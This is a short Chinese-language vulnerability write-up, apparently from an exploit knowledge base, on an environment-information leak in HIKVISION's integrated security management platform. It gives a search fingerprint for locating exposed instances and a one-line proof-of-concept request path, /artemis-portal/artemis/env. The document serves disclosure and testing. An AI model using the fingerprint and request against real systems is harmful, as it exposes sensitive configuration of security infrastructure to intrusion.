# HiKVISION 综合安防管理平台 env 信息泄漏漏洞

## 漏洞描述

HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击

## 漏洞影响

<a-checkbox checked>HIKVISION 综合安防管理平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="HIKVISION-综合安防管理平台"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1647517887798-06e24b68-d89a-4223-aee3-50ca22081807-1646007.png)

验证POC

```javascript
/artemis-portal/artemis/env 
```

![img](../../../.vuepress/public/img/1679555425852-b9369d03-d3e3-42dc-af4c-f4140ccfbba6.png)